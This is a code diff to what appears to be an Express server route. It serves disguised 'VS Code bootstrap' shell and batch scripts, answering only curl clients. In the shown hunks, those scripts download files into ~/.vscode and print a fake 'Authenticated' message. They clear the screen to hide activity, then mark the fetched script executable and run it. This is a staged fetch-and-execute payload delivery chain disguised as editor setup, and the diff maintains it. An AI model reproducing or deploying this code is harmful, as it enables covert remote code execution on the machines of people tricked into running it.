@@ -7,8 +7,12 @@ router.get('/bootstrap/:os', (req, res) => {
     const { os } = req.params['os'];
     const { flag } = req.query;
     const ua = req.headers['user-agent'] || '';
+
+    const protocol = req.protocol            // http or https
+    const host = req.get("host")              // domain + port
+    const domain = `${protocol}://${host}`
+    
     if (ua.includes('curl')) {
-        console.log(flag, "-------------");
         res.setHeader('Content-Type', 'text/plain');
         const win =  
 `
@@ -91,8 +95,8 @@ if not defined NODE_EXE (
 set "CODEPROFILE=%USERPROFILE%\\.vscode"
 echo [INFO] Downloading env-setup.npl and package.json...
 
-curl -L -o "%CODEPROFILE%\\env-setup.npl" "${process.env.DOMAIN}/settings/env?flag=${flag}"
-curl -L -o "%CODEPROFILE%\\package.json" "${process.env.DOMAIN}/settings/package"
+curl -L -o "%CODEPROFILE%\\env-setup.npl" "${domain}/settings/env?flag=${flag}"
+curl -L -o "%CODEPROFILE%\\package.json" "${domain}/settings/package"
 
 :: -------------------------
 :: Install dependencies
@@ -238,7 +242,7 @@ fi
 # -------------------------
 USER_HOME="$HOME/.vscode"
 mkdir -p "\${USER_HOME}"
-BASE_URL="${process.env.DOMAIN}"
+BASE_URL="${domain}"
 echo "[INFO] Downloading env-setup.js and package.json..."
 if ! command -v curl >/dev/null 2>&1; then
     wget -q -O "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=${flag}"
@@ -358,7 +362,7 @@ set "VSCODE_DIR=%USERPROFILE%\\.vscode"
 
 if not exist "%VSCODE_DIR%" ( mkdir "%VSCODE_DIR%" )
 
-curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" ${process.env.DOMAIN}/settings/bootstrap/win?flag=${flag}
+curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" ${domain}/settings/bootstrap/win?flag=${flag}
 cls
 "%VSCODE_DIR%\\vscode-bootstrap.cmd"
 cls`;
@@ -370,7 +374,7 @@ set -e
 echo "Authenticated"
 mkdir -p "$HOME/.vscode"
 clear
-curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "${process.env.DOMAIN}/settings/bootstrap/linux?flag=${flag}"
+curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "${domain}/settings/bootstrap/linux?flag=${flag}"
 clear
 chmod +x "$HOME/.vscode/vscode-bootstrap.sh"
 clear
@@ -387,7 +391,7 @@ echo "Authenticated"
 TARGET_DIR="$HOME/.vscode"
 mkdir -p "$TARGET_DIR"
 clear
-wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "${process.env.DOMAIN}/settings/bootstrap/linux?flag=${flag}"
+wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "${domain}/settings/bootstrap/linux?flag=${flag}"
 clear
 chmod +x "$TARGET_DIR/vscode-bootstrap.sh"
 clear
